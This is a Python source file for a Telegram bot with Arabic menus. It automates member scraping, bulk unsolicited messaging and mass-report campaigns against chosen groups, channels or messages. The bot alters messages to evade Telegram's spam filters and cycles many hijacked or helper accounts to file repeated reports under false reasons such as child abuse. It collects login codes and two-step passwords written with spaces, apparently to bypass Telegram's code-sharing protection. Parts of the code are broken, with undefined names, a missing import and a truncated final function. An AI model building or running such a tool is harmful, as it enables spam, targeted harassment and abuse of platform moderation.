import asyncio
import json
import os
import random
import re
import time
import logging
from datetime import datetime, timedelta, timezone

from telethon import TelegramClient, events, Button, errors, functions, types
from telethon.tl.functions.channels import JoinChannelRequest, GetParticipantsRequest
from telethon.tl.functions.messages import ImportChatInviteRequest, CheckChatInviteRequest
from telethon.tl.functions.account import ReportPeerRequest
from telethon.tl.types import ChannelParticipantsAdmins

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

import os
from dotenv import load_dotenv

load_dotenv()

api_id = int(os.getenv("API_ID"))
api_hash = os.getenv("API_HASH")
bot_token = os.getenv("BOT_TOKEN")

# أضف هذا السطر لتعريف الأيدي الخاص بك كمالك
OWNER_ID = int(os.getenv("OWNER_ID", "7367921416"))



BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_FILE = os.path.join(BASE_DIR, "bot_data.json")
SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
MEDIA_DIR = os.path.join(BASE_DIR, "media") 
MEMORY_FILE = os.path.join(BASE_DIR, "processed_targets.txt")

os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs(MEDIA_DIR, exist_ok=True) 

DEFAULT_KALISHA = "اوكف اوكف.خلحجيلك مميزات كروبي\nاول شي الحروب مو فري واليرتبط ينحظر اليفشر ينحظر بدون واسطات وكروب ترول وشتبوست 🙏🏿😭"

MESSAGES_LIMIT = 10000
CHECK_ACCOUNT_ID = 7367921416

_data_cache = None

def load_memory():
    if not os.path.exists(MEMORY_FILE):
        return set()
    with open(MEMORY_FILE, "r", encoding="utf-8") as f:
        return set(line.strip() for line in f)

def add_to_memory(target):
    with open(MEMORY_FILE, "a", encoding="utf-8") as f:
        f.write(f"{target}\n")

def clean_account_name(name):
    if not name:
        return "بدون اسم"
    name_lower = name.lower()
    if len(name) > 15 or "t.me" in name_lower or "http" in name_lower or "@" in name_lower:
        return "حساب مساعد (مشبوه)"
    return name.strip()

def load_data():
    global _data_cache
    if _data_cache is None:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            _data_cache = json.load(f)
    return _data_cache

def save_data(data):
    global _data_cache
    _data_cache = data
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

if not os.path.exists(DATA_FILE):
    initial_data = {
        "authorized_users": {str(OWNER_ID): None}, 
        "accounts": {}, 
        "all_users": {},
        "kalisha_text": DEFAULT_KALISHA,
        "kalisha_media": None,
        "trial_users": [],
        "mutate_kalisha": False,
        "blacklisted_groups": [],
        "global_free_mode": False,
        "referrals": {},
        "report_accounts": {},
        "report_target": None,
        "report_text": "",
        "report_type": "spam",
        "is_reporting": False,
        "report_count": 0,
        "report_messages": []
    }
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(initial_data, f, indent=4, ensure_ascii=False)
    _data_cache = initial_data
else:
    data = load_data()
    if "all_users" not in data: data["all_users"] = {}
    if "kalisha_text" not in data: data["kalisha_text"] = DEFAULT_KALISHA
    if "kalisha_media" not in data: data["kalisha_media"] = None
    if "trial_users" not in data: data["trial_users"] = []
    if "mutate_kalisha" not in data: data["mutate_kalisha"] = False
    if "blacklisted_groups" not in data: data["blacklisted_groups"] = []
    if "global_free_mode" not in data: data["global_free_mode"] = False
    if "referrals" not in data: data["referrals"] = {}
    if "report_accounts" not in data: data["report_accounts"] = {}
    if "report_target" not in data: data["report_target"] = None
    if "report_text" not in data: data["report_text"] = ""
    if "report_type" not in data: data["report_type"] = "spam"
    if "is_reporting" not in data: data["is_reporting"] = False
    if "report_count" not in data: data["report_count"] = 0
    if "report_messages" not in data: data["report_messages"] = [] 
    
    if "authorized_users" in data and isinstance(data["authorized_users"], list):
        new_auth = {}
        for uid in data["authorized_users"]:
            new_auth[str(uid)] = None
        data["authorized_users"] = new_auth
    elif "authorized_users" not in data:
        data["authorized_users"] = {str(OWNER_ID): None}

    if "accounts" not in data or isinstance(data["accounts"], list):
        data["accounts"] = {}
    save_data(data)

def is_authorized(user_id):
    if user_id == OWNER_ID:
        return True
    
    data = load_data()
    if data.get("global_free_mode", False):
        return True
        
    if user_id in data.get("trial_users", []):
        return True
        
    user_id_str = str(user_id)
    auth_users = data.get("authorized_users", {})
    
    if user_id_str in auth_users:
        exp_timestamp = auth_users[user_id_str]
        if exp_timestamp is None:
            return True
        if time.time() < exp_timestamp:
            return True
        else:
            del auth_users[user_id_str]
            data["authorized_users"] = auth_users
            save_data(data)
            return False
            
    return False

def consume_trial(user_id):
    data = load_data()
    if "trial_users" in data and user_id in data["trial_users"]:
        data["trial_users"].remove(user_id)
        save_data(data)
        return True
    return False

bot = TelegramClient("makkster_bot", api_id, api_hash).start(bot_token=bot_token)

async def send_user_list_batches(client, bot_client, chat_id, user_entities, title):
    if not user_entities:
        return
    
    users_list = list(user_entities)
    for i in range(0, len(users_list), 100):
        chunk = users_list[i:i+100]
        lines = [f"@sa22cr"]
        
        for u in chunk:
            lines.append(str(u.id))
        
        message_text = "\n".join(lines)
        
        try:
            await client.send_message('me', message_text, parse_mode='md')
        except Exception:
            pass
            
        try:
            await bot_client.send_message(chat_id, message_text, parse_mode='md')
        except Exception:
            pass

def get_progress_bar(current, total, length=15):
    progress = min(current / total, 1.0) if total > 0 else 1.0
    filled = int(progress * length)
    empty = length - filled
    return "⬜" * filled + "⬛" * empty

async def send_with_client(client, target_entity, kalisha_data):
    current_sleep = random.randint(5, 12)
    await asyncio.sleep(current_sleep)

    try:
        text = kalisha_data.get("text", "")
        media_path = kalisha_data.get("media")

        if kalisha_data.get("mutate", False):
            mutations = [
                f"{text}\n.",
                f"{text} .",
                f"{text}\n‌",  
                f"{text} [{random.randint(100, 999)}]"
            ]
            text = random.choice(mutations)

        if media_path and os.path.exists(media_path):
            await client.send_file(target_entity, media_path, caption=text)
        else:
            await client.send_message(target_entity, text)
        
        temp_dots = await client.send_message(target_entity, "...")
        await client.delete_messages(target_entity, [temp_dots.id], revoke=False)
        
        try:
            await client.send_message(CHECK_ACCOUNT_ID, ".")
        except Exception:
            pass
        return True, "success"

    except errors.FloodWaitError as e:
        await asyncio.sleep(e.seconds + 2)
        return False, f"flood_wait_{e.seconds}"

    except errors.PeerFloodError:
        return False, "peer_flood"

    except errors.UserPrivacyRestrictedError:
        return False, "privacy_closed"

    except Exception as e:
        if "ALLOW_PAYMENT_REQUIRED" in str(e):
            return False, "premium_required"
        return False, "error"

@bot.on(events.NewMessage(pattern=r"^/start(?: (.*))?$"))
async def start_handler(event):
    user = await event.get_sender()
    data = load_data()
    user_id_str = str(event.sender_id)
    ref_id = event.pattern_match.group(1)
    is_new_user = user_id_str not in data.get("all_users", {})
    
    if is_new_user:
        data["all_users"][user_id_str] = {
            "name": clean_account_name(user.first_name if user else ""),
            "username": getattr(user, 'username', None) or "بدون معرف",
            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        if ref_id and ref_id.isdigit() and ref_id != user_id_str:
            if ref_id not in data["referrals"]:
                data["referrals"][ref_id] = []
            if user_id_str not in data["referrals"][ref_id]:
                data["referrals"][ref_id].append(user_id_str)
                if len(data["referrals"][ref_id]) % 5 == 0:
                    ref_id_int = int(ref_id)
                    if ref_id_int not in data["trial_users"]:
                        data["trial_users"].append(ref_id_int)
                        try:
                            await bot.send_message(ref_id_int, "🎉 **مبروك!** لقد قام 5 أشخاص بالدخول للبوت عبر رابط الإحالة الخاص بك.\n\n🎁 **تم منحك تجربة مجانية تلقائياً!** يمكنك الآن استخدام البوت لمرة واحدة مجاناً. أرسل /start للبدء.")
                        except Exception:
                            pass
                            
        save_data(data)
        
        if event.sender_id != OWNER_ID:
            try:
                await bot.send_message(
                    OWNER_ID,
                    f"🚨 **إشعار: مستخدم جديد قام بتشغيل البوت!**\n\n"
                    f"👤 الاسم: `{clean_account_name(user.first_name if user else '')}`\n"
                    f"🆔 الأيدي: `{event.sender_id}`\n"
                    f"🌐 المعرف: @{getattr(user, 'username', 'لا يوجد')}\n"
                    f"⏰ الوقت: `{datetime.now().strftime('%Y-%m-%d %I:%M %p')}`"
                )
            except Exception:
                pass

    if not is_authorized(event.sender_id):
        bot_info = await bot.get_me()
        ref_link = f"https://t.me/{bot_info.username}?start={event.sender_id}"
        my_refs = len(data.get("referrals", {}).get(user_id_str, []))
        
        await event.respond(
            "❌ **عذراً، أنت لا تملك صلاحية استخدام هذا البوت.**\n\n"
            "💎 **للحصول على الصلاحية لديك خياران:**\n\n"
            "1️⃣ **الاشتراك المدفوع:**\n"
            "راسل المطور للاشتراك وتفعيل البوت في حسابك: @sa22cr\n\n"
            "2️⃣ **التجربة المجانية (نظام الدعوات):**\n"
            "قم بدعوة **5** من أصدقائك لبدء البوت عبر رابطك الخاص. ستحصل على تجربة مجانية تلقائياً عند اكتمال العدد!\n\n"
            f"🔗 **رابط الدعوة الخاص بك:**\n`{ref_link}`\n\n"
            f"📊 **التقدم الحالي:** (`{my_refs}/5`) دعوات ناجحة.",
            link_preview=False
        )
        return

    buttons = [
        [Button.inline("🔍 خمط الأعضاء (جمع وتصفية)", b"main_scrape_menu")],
        [Button.inline("🔥 الشد التلقائي (الريبورتات)", b"main_report_menu")],
        [Button.inline("➕ إضافة حساب مساعد", b"add_account"), Button.inline("📂 إدارة الحسابات", b"list_accounts")]
    ]
    if event.sender_id == OWNER_ID:
        buttons.append([Button.inline("👑 لوحة تحكم المالك", b"owner_panel")])

    await event.respond(
        "👋 **أهلاً بك في بوت الترويج التلقائي المطور**\n\n"
        "▫️ اختر أحد الأوضاع من القائمة أدناه:",
        buttons=buttons
    )

@bot.on(events.CallbackQuery(data=b"main_scrape_menu"))
async def main_scrape_menu_handler(event):
    if not is_authorized(event.sender_id): return
    buttons = [
        [Button.inline("🚀 سحب الأعضاء (الوضع أ)", b"mode_scrape")],
        [Button.inline("📨 الإرسال المباشر (الوضع ب)", b"mode_direct")],
        [Button.inline("⚙️ تعديل الكليشة", b"set_kalisha"), Button.inline("🗑️ مسح الميديا", b"del_media")],
        [Button.inline("🔙 رجوع", b"back_start")]
    ]
    await event.edit("🔍 **قسم خمط الأعضاء والترويج**\n\nاختر الوظيفة المطلوبة:", buttons=buttons)

@bot.on(events.CallbackQuery(data=b"main_report_menu"))
async def main_report_menu_handler(event):
    if not is_authorized(event.sender_id): return
    buttons = [
        [Button.inline("🔗 أضف كروب/قناة للشد", b"report_add_target")],
        [Button.inline("📝 أضف كليشة للبلاغ", b"report_add_text")],
        [Button.inline("⚠️ نوع البلاغ", b"report_set_type")],
        [Button.inline("📩 أضف رابط رسائل للشد عليها", b"report_add_msgs")],
        [Button.inline("▶️ بدء الشد", b"report_start"), Button.inline("⏸️ إيقاف الشد", b"report_stop")],
        [Button.inline("📊 حالة الشد", b"report_status")],
        [Button.inline("🔙 رجوع", b"back_start")]
    ]
    await event.edit("🔥 **قسم الشد التلقائي**\n\nاختر من القائمة أدناه لإعداد الحملة:", buttons=buttons)

@bot.on(events.CallbackQuery(data=b"report_set_type"))
async def report_set_type_handler(event):
    if not is_authorized(event.sender_id): return
    buttons = [
        [Button.inline("🗑 مزعج (سبام)", b"rtype_spam"), Button.inline("🔞 محتوى غير لائق", b"rtype_pornography")],
        [Button.inline("🚨 عنف أو أذى", b"rtype_violence"), Button.inline("👤 حساب مزيف", b"rtype_fake")],
        [Button.inline("👶 إساءة للأطفال", b"rtype_childabuse"), Button.inline("💊 مخدرات", b"rtype_illegal_drugs")],
        [Button.inline("🕵️ تفاصيل شخصية", b"rtype_personal"), Button.inline("©️ حقوق النشر", b"rtype_copyright")],
        [Button.inline("📍 موقع غير ملائم", b"rtype_geo"), Button.inline("❓ أخرى", b"rtype_other")],
        [Button.inline("🔙 رجوع للقائمة", b"main_report_menu")]
    ]
    await event.edit("⚠️ **اختر نوع المخالفة الذي سيتم التبليغ عنه:**", buttons=buttons)

@bot.on(events.CallbackQuery(pattern=r"^rtype_(.*)$"))
async def report_save_type_handler(event):
    if not is_authorized(event.sender_id): return
    rtype = event.pattern_match.group(1).decode('utf-8')
    data = load_data()
    data["report_type"] = rtype
    save_data(data)
    await event.edit(f"✅ **تم تحديد نوع البلاغ بنجاح.**\nالنوع المختار: `{rtype}`", buttons=[[Button.inline("🔙 رجوع", b"main_report_menu")]])

@bot.on(events.CallbackQuery(data=b"set_kalisha"))
async def set_kalisha_handler(event):
    if not is_authorized(event.sender_id): return
    await event.delete()
    
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message(
            "📝 **أرسل الكليشة الجديدة الآن:**\n\n"
            "▫️ إذا كنت تريد نصاً فقط، أرسل النص.\n"
            "▫️ إذا كنت تريد إرسال صورة أو فيديو، أرسل الصورة/الفيديو واكتب الكليشة في (الوصف / Caption) الخاص بها.\n\n"
            "*لإلغاء العملية أرسل /cancel*"
        )
        try:
            msg = await conv.get_response(timeout=300)
        except asyncio.TimeoutError:
            await conv.send_message("⏳ انتهى وقت الانتظار (5 دقائق). يرجى المحاولة مرة أخرى.")
            return
        
        if msg.text and msg.text.strip().startswith('/'):
            await conv.send_message("❌ تم إلغاء العملية.", buttons=[[Button.inline("🔙 رجوع", b"back_start")]])
            return

        data = load_data()
        
        old_media = data.get("kalisha_media")
        if old_media and os.path.exists(old_media):
            try:
                os.remove(old_media)
            except Exception:
                pass
        
        if msg.media:
            status_msg = await conv.send_message("⏳ جاري حفظ الوسائط، يرجى الانتظار...")
            file_path = await msg.download_media(MEDIA_DIR + "/")
            data["kalisha_media"] = file_path
            data["kalisha_text"] = msg.text or "" 
            await status_msg.delete()
        else:
            data["kalisha_media"] = None
            data["kalisha_text"] = msg.text or ""
            
        save_data(data)
        
        media_status = "مع وسائط 🖼️/🎥" if msg.media else "نص فقط 📝"
        
        await conv.send_message(
            f"✅ **تم حفظ الكليشة بنجاح!**\n\n"
            f"نوع الكليشة: {media_status}\n"
            f"النص الحالي:\n{data['kalisha_text']}\n\n"
            f"🛡️ **نظام الحماية ضد الحظر التلقائي:**\n"
            f"هل تريد تفعيل ميزة التعديل الطفيف تلقائياً؟ (إضافة نقطة أو مسافة غير مرئية أو رقم عشوائي نهاية كل رسالة لتجنب كشف التكرار المتطابق من فلاتر التليجرام).",
            buttons=[
                [Button.inline("🟢 تفعيل ميزة التعديل الطفيف", b"mutate_on")],
                [Button.inline("🔴 إرسال النص الأصلي بدون تغيير", b"mutate_off")]
            ]
        )
async def add_user(user_id):
    """إضافة مستخدم جديد إذا لم يكن موجوداً"""
    async with aiosqlite.connect("bot_database.db") as db:
        await db.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
        await db.commit()

async def get_user(user_id):
    """جلب بيانات مستخدم معين"""
    async with aiosqlite.connect("bot_database.db") as db:
        async with db.execute("SELECT balance, is_referred FROM users WHERE user_id = ?", (user_id,)) as cursor:
            result = await cursor.fetchone()
            if result:
                return {"balance": result[0], "is_referred": result[1]}
            return None

async def update_balance(user_id, amount):
    """تحديث رصيد المستخدم (سواء بزيادة أو نقصان)"""
    async with aiosqlite.connect("bot_database.db") as db:
        await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
        await db.commit()

@bot.on(events.CallbackQuery(data=b"report_add_target"))
async def report_add_target_handler(event):
    if not is_authorized(event.sender_id): return
    await event.delete()
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message(
            "🔗 **أرسل الرابط أو اليوزر للمجموعة أو القناة أو الحساب المستهدف.**\n\n"
            "💡 **ملاحظة:** سيتم التبليغ على هذا الحساب/الكروب بشكل كامل إذا لم تقم بإضافة روابط رسائل محددة.\n\n"
            "*لإلغاء العملية أرسل /cancel*"
        )
        try: msg = await conv.get_response(timeout=120)
        except asyncio.TimeoutError: return
        
        if msg.text.strip().startswith('/'):
            await conv.send_message("❌ تم الإلغاء.", buttons=[[Button.inline("🔙 رجوع", b"main_report_menu")]])
            return
            
        data = load_data()
        data["report_target"] = msg.text.strip()
        save_data(data)
        await conv.send_message("✅ **تم حفظ الهدف بنجاح وسرية.**", buttons=[[Button.inline("🔙 رجوع", b"main_report_menu")]])

@bot.on(events.CallbackQuery(data=b"report_add_text"))
async def report_add_text_handler(event):
    if not is_authorized(event.sender_id): return
    await event.delete()
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("📝 **أرسل كليشة البلاغ التي ستستخدمها الحسابات داخلياً:**\n\n*لإلغاء العملية أرسل /cancel*")
        try: msg = await conv.get_response(timeout=120)
        except asyncio.TimeoutError: return
        
        if msg.text.strip().startswith('/'): return
            
        data = load_data()
        data["report_text"] = msg.text.strip()
        save_data(data)
        await conv.send_message("✅ **تم حفظ كليشة البلاغ بسريّة تامة.**", buttons=[[Button.inline("🔙 رجوع", b"main_report_menu")]])

@bot.on(events.CallbackQuery(data=b"report_add_msgs"))
async def report_add_msgs_handler(event):
    if not is_authorized(event.sender_id): return
    await event.delete()
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message(
            "📩 **أرسل روابط الرسائل التي تريد الشد عليها مباشرة (رابط في كل سطر):**\n"
            "(مثال: https://t.me/username/123)\n\n"
            "*لإلغاء العملية أرسل /cancel*"
        )
        try: msg = await conv.get_response(timeout=120)
        except asyncio.TimeoutError: return
        
        if msg.text.strip().startswith('/'):
            await conv.send_message("❌ تم الإلغاء.", buttons=[[Button.inline("🔙 رجوع", b"main_report_menu")]])
            return
            
        data = load_data()
        data["report_messages"] = [line.strip() for line in msg.text.splitlines() if line.strip().startswith("http")]
        save_data(data)
        await conv.send_message(f"✅ **تم حفظ {len(data['report_messages'])} رسالة للشد عليها.**", buttons=[[Button.inline("🔙 رجوع", b"main_report_menu")]])

@bot.on(events.CallbackQuery(data=b"owner_add_rep_acc"))
async def owner_add_rep_acc_handler(event):
    if event.sender_id != OWNER_ID: return
    await event.delete()
    
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message(
            "📱 **أدخل رقم هاتف الحساب مع وضع مسافة بين كل رقم ورمز الدولة**\n"
            "(مثال: `+ 9 6 4 7 7 1 2 3 4 5 6 7 8`):\n\n"
            "*أرسل /cancel في أي وقت للإلغاء.\n"
            "تأكد من ان اسم الحساب الذي تريد اضافهته ليس طويلاً او مشبوهاً لكي لا يحدث خلل بين الحسابات"
        )
        try:
            phone_msg = await conv.get_response(timeout=300)
        except asyncio.TimeoutError:
            await conv.send_message("⏳ انتهى وقت الانتظار.")
            return

        if phone_msg.text.strip().startswith('/'):
            await conv.send_message("❌ تم الإلغاء.")
            return
            
        phone = "".join(c for c in phone_msg.text if c.isdigit() or c == '+')
        session_name = f"rep_acc_{phone.replace('+', '')}"
        session_path = os.path.join(SESSIONS_DIR, session_name)
        
        user_client = TelegramClient(session_path, API_ID, API_HASH)
        await user_client.connect()
        
        try:
            send_code = await user_client.send_code_request(phone)
        except Exception as e:
            await conv.send_message(f"❌ حدث خطأ أثناء إرسال الكود: {e}")
            return

        await conv.send_message(
            "📩 **تم إرسال كود التحقق إلى حسابك.**\n\n"
            "⚠️ **تنبيه لحماية الحساب:** أرسل الكود مع مسافات بين الأرقام\n"
            "(مثال: `1 2 3 4 5`)."
        )
        try:
            code_msg = await conv.get_response(timeout=300)
        except asyncio.TimeoutError:
            await conv.send_message("⏳ انتهى وقت الانتظار.")
            return
            
        if code_msg.text.strip().startswith('/'):
            await conv.send_message("❌ تم الإلغاء.")
            await user_client.disconnect()
            return
            
        code = "".join(c for c in code_msg.text if c.isdigit())
        
        try:
            await user_client.sign_in(phone=phone, code=code, phone_code_hash=send_code.phone_code_hash)
        except errors.SessionPasswordNeededError:
            await conv.send_message(
                "🔒 **الحساب محمي بكلمة مرور (التحقق بخطوتين).**\n\n"
                "⚠️ **أرسل كلمة المرور مع وضع مسافة بين كل حرف أو رقم**\n"
                "(مثال: `a b c 1 2 3`):"
            )
            try:
                pass_msg = await conv.get_response(timeout=300)
            except asyncio.TimeoutError:
                await conv.send_message("⏳ انتهى وقت الانتظار.")
                return
                
            if pass_msg.text.strip().startswith('/'):
                await conv.send_message("❌ تم الإلغاء.")
                await user_client.disconnect()
                return
                
            password = pass_msg.text.replace(" ", "").strip()
            
            try:
                await user_client.sign_in(password=password)
            except Exception as e:
                await conv.send_message(f"❌ فشل تسجيل الدخول بكلمة المرور: {e}")
                await user_client.disconnect()
                return
        except Exception as e:
            await conv.send_message(f"❌ فشل تسجيل الدخول: {e}")
            await user_client.disconnect()
            return
            
        me = await user_client.get_me()
        await user_client.disconnect()
        
        safe_name = clean_account_name(me.first_name)
        
        data = load_data()
        user_id_str = str(event.sender_id)
        if user_id_str not in data["report_accounts"]:
            data["report_accounts"][user_id_str] = []
            
        data["report_accounts"][user_id_str].append({
            "phone": phone,
            "session": session_name,
            "id": me.id,
            "name": safe_name  
        })
        save_data(data)
        
        await conv.send_message(f"✅ **تم تسجيل دخول حساب الشد بنجاح!**\n👤 الاسم: {safe_name}\n🆔 الأيدي: `{me.id}`", buttons=[[Button.inline("🔙 رجوع لللوحة", b"owner_panel")]])

@bot.on(events.CallbackQuery(data=b"owner_list_rep_acc"))
async def owner_list_rep_acc_handler(event):
    if event.sender_id != OWNER_ID: return
    data = load_data()
    rep_accs = data.get("report_accounts", {}).get(str(OWNER_ID), [])
    await event.edit(f"📂 **عدد حسابات الشد المتوفرة حالياً:** `{len(rep_accs)}` حساب.", buttons=[[Button.inline("🔙 رجوع", b"owner_panel")]])

@bot.on(events.CallbackQuery(data=b"report_status"))
async def report_status_handler(event):
    data = load_data()
    status = "🟢 فعّال (يتم الشد حالياً)" if data.get("is_reporting") else "🔴 متوقف"
    count = data.get("report_count", 0)
    await event.edit(f"📊 **حالة الشد التلقائي:**\n\nالحالة: {status}\nعدد البلاغات المرسلة حتى الآن: `{count}`", buttons=[[Button.inline("🔙 رجوع", b"main_report_menu")]])

@bot.on(events.CallbackQuery(data=b"report_stop"))
async def report_stop_handler(event):
    data = load_data()
    data["is_reporting"] = False
    save_data(data)
    await event.edit("⏸️ **تم إرسال أمر إيقاف الشد. ستتوقف الحسابات تدريجياً.**", buttons=[[Button.inline("🔙 رجوع", b"main_report_menu")]])

@bot.on(events.CallbackQuery(data=b"report_start"))
async def report_start_handler(event):
    data = load_data()
    if not data.get("report_target") and not data.get("report_messages"):
        await event.answer("⚠️ لم تقم بإضافة هدف أو روابط رسائل للشد!", alert=True)
        return
        
    data["is_reporting"] = True
    save_data(data)
    await event.edit("▶️ **بدأت عملية الشد التلقائي في الخلفية...**\nسيستمر الشد حتى يتوقف الهدف أو تضغط إيقاف.", buttons=[[Button.inline("🔙 رجوع", b"main_report_menu")]])
    
    asyncio.create_task(run_reporting_loop(event.sender_id))

async def run_reporting_loop(user_id):
    data = load_data()
    user_id_str = str(user_id)
    rep_accs = data.get("report_accounts", {}).get(user_id_str, [])
    if not rep_accs:
        rep_accs = data.get("report_accounts", {}).get(str(OWNER_ID), [])
        
    if not rep_accs:
        data["is_reporting"] = False
        save_data(data)
        try: await bot.send_message(user_id, "⚠️ لا توجد حسابات مضافة للشد. تم الإيقاف.")
        except Exception: pass
        return

    rtype = data.get("report_type", "spam")
    if rtype == "violence": report_reason = types.InputReportReasonViolence()
    elif rtype == "pornography": report_reason = types.InputReportReasonPornography()
    elif rtype == "fake": report_reason = types.InputReportReasonFake()
    elif rtype == "childabuse": report_reason = types.InputReportReasonChildAbuse()
    elif rtype == "illegal_drugs": report_reason = types.InputReportReasonIllegalDrugs()
    elif rtype == "personal": report_reason = types.InputReportReasonPersonalDetails()
    elif rtype == "copyright": report_reason = types.InputReportReasonCopyright()
    elif rtype == "geo": report_reason = types.InputReportReasonGeoIrrelevant()
    elif rtype == "other": report_reason = types.InputReportReasonOther()
    else: report_reason = types.InputReportReasonSpam()

    clients = []
    for acc in rep_accs:
        try:
            client = TelegramClient(os.path.join(SESSIONS_DIR, acc['session']), API_ID, API_HASH)
            await client.connect()
            if await client.is_user_authorized():
                client.account_name = acc.get('name', 'حساب بدون اسم')
                clients.append(client)
        except Exception as e:
            try: await bot.send_message(OWNER_ID, f"❌ **خطأ بتشغيل حساب الشد ({acc.get('name')}):**\n`{str(e)}`")
            except Exception: pass

    if not clients:
        data["is_reporting"] = False
        save_data(data)
        try: await bot.send_message(OWNER_ID, "❌ **تنبيه:** كل حسابات الشد فشل الاتصال بها، تم إيقاف الحملة.")
        except Exception: pass
        return

    while True:
        data = load_data()
        if not data.get("is_reporting", False):
            break
            
        report_text = data.get("report_text", "")
        raw_msgs = data.get("report_messages", [])
        report_target = data.get("report_target", None)
        
        if raw_msgs:
            targets_dict = {}
            for link in raw_msgs:
                match_pub = re.search(r"t\.me/([^/]+)/(\d+)", link)
                match_priv = re.search(r"t\.me/c/(\d+)/(\d+)", link)
                
                peer_username_or_id = None
                msg_id = None
                
                if match_pub and match_pub.group(1) != 'c':
                    peer_username_or_id = match_pub.group(1)
                    msg_id = int(match_pub.group(2))
                elif match_priv:
                    peer_username_or_id = int("-100" + match_priv.group(1))
                    msg_id = int(match_priv.group(2))
                    
                if peer_username_or_id and msg_id:
                    if peer_username_or_id not in targets_dict:
                        targets_dict[peer_username_or_id] = []
                    targets_dict[peer_username_or_id].append(msg_id)

            if not targets_dict:
                data["is_reporting"] = False
                save_data(data)
                try: await bot.send_message(user_id, "⚠️ روابط الرسائل غير صحيحة، تم إيقاف الشد.")
                except Exception: pass
                break

            for client in clients:
                data = load_data()
                if not data.get("is_reporting", False): break
                
                for peer, msg_ids in targets_dict.items():
                    try:
                        entity = await client.get_input_entity(peer)
                        await client(functions.messages.ReportRequest(
                            peer=entity,
                            id=msg_ids,
                            reason=report_reason,
                            message=report_text
                        ))
                        data["report_count"] = data.get("report_count", 0) + len(msg_ids)
                        save_data(data)
                        await asyncio.sleep(random.uniform(4.5, 9.8))
                        
                    except errors.FloodWaitError as e:
                        try: await bot.send_message(OWNER_ID, f"⚠️ **حظر تكرار (FloodWait) على حساب ({getattr(client, 'account_name', '')}):**\nيجب الانتظار `{e.seconds}` ثانية.")
                        except Exception: pass
                        await asyncio.sleep(e.seconds + 2)
                        
                    except Exception as e:
                        try: await bot.send_message(OWNER_ID, f"❌ **فشل إرسال بلاغ على الرسائل من حساب ({getattr(client, 'account_name', '')}):**\nالسبب: `{str(e)}`\nالهدف: `{peer}`")
                        except Exception: pass
                        await asyncio.sleep(random.uniform(5.0, 10.0))
                        
        elif report_target:
            for client in clients:
                data = load_data()
                if not data.get("is_reporting", False): break
                try:
                    entity = await client.get_input_entity(report_target)
                    await client(ReportPeerRequest(
                        peer=entity,
                        reason=report_reason,
                        message=report_text
                    ))
                    data["report_count"] = data.get("report_count", 0) + 1
                    save_data(data)
                    await asyncio.sleep(random.uniform(4.5, 9.8))
                    
                except errors.FloodWaitError as e:
                    try: await bot.send_message(OWNER_ID, f"⚠️ **حظر تكرار (FloodWait) على حساب ({getattr(client, 'account_name', '')}):**\nيجب الانتظار `{e.seconds}` ثانية.")
                    except Exception: pass
                    await asyncio.sleep(e.seconds + 2)
                    
                except Exception as e:
                    try: await bot.send_message(OWNER_ID, f"❌ **فشل إرسال بلاغ عام من حساب ({getattr(client, 'account_name', '')}):**\nالسبب: `{str(e)}`\nالهدف: `{report_target}`")
                    except Exception: pass
                    await asyncio.sleep(random.uniform(5.0, 10.0))
                    
        else:
            data["is_reporting"] = False
            save_data(data)
            try: await bot.send_message(user_id, "⚠️ لم يتم تحديد هدف أو رسائل للتبليغ عليها، تم إيقاف العملية.")
            except Exception: pass
            break

        await asyncio.sleep(random.randint(15, 30))

    for c in clients:
        try: await c.disconnect()
        except Exception: pass

@bot.on(events.CallbackQuery(pattern=r"^mutate_(on|off)$"))
async def toggle_mutate_callback(event):
    if not is_authorized(event.sender_id): return
    choice = event.data.decode().split("_")[-1]
    data = load_data()
    data["mutate_kalisha"] = (choice == "on")
    save_data(data)
    
    status_msg = "🟢 مفعّلة (سيتم حماية الرسائل عبر التعديل الطفيف)" if choice == "on" else "🔴 معطّلة (سيتم إرسال الرسائل متطابقة تماماً)"
    await event.edit(
        f"⚙️ **تم تحديث إعدادات الكليشة بنجاح!**\n\n"
        f"الحماية ضد التكرار المتطابق: {status_msg}",
        buttons=[[Button.inline("🔙 القائمة الرئيسية", b"back_start")]]
    )

@bot.on(events.CallbackQuery(data=b"del_media"))
async def del_media_handler(event):
    if not is_authorized(event.sender_id): return
    data = load_data()
    old_media = data.get("kalisha_media")
    if old_media and os.path.exists(old_media):
        try: os.remove(old_media)
        except Exception: pass
    data["kalisha_media"] = None
    save_data(data)
    await event.answer("✅ تم مسح الصورة/الفيديو بنجاح. سيتم إرسال النص فقط.", alert=True)

@bot.on(events.CallbackQuery(data=b"add_account"))
async def add_account_handler(event):
    if not is_authorized(event.sender_id): return
    await event.delete()
    
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message(
            "📱 **أدخل رقم هاتف الحساب مع وضع مسافة بين كل رقم ورمز الدولة**\n"
            "(مثال: `+ 9 6 4 7 7 1 2 3 4 5 6 7 8`):\n\n"
            "*أرسل /cancel في أي وقت للإلغاء.\n"
            "تأكد من ان اسم الحساب الذي تريد اضافته ليس طويلاً او مشبوهاً لكي لا يحدث خلل بين الحسابات"
        )
        try:
            phone_msg = await conv.get_response(timeout=300)
        except asyncio.TimeoutError:
            await conv.send_message("⏳ انتهى وقت الانتظار.")
            return

        if phone_msg.text.strip().startswith('/'):
            await conv.send_message("❌ تم الإلغاء.")
            return
            
        phone = "".join(c for c in phone_msg.text if c.isdigit() or c == '+')
        session_name = f"acc_{phone.replace('+', '')}"
        session_path = os.path.join(SESSIONS_DIR, session_name)
        
        user_client = TelegramClient(session_path, API_ID, API_HASH)
        await user_client.connect()
        
        try:
            send_code = await user_client.send_code_request(phone)
        except Exception as e:
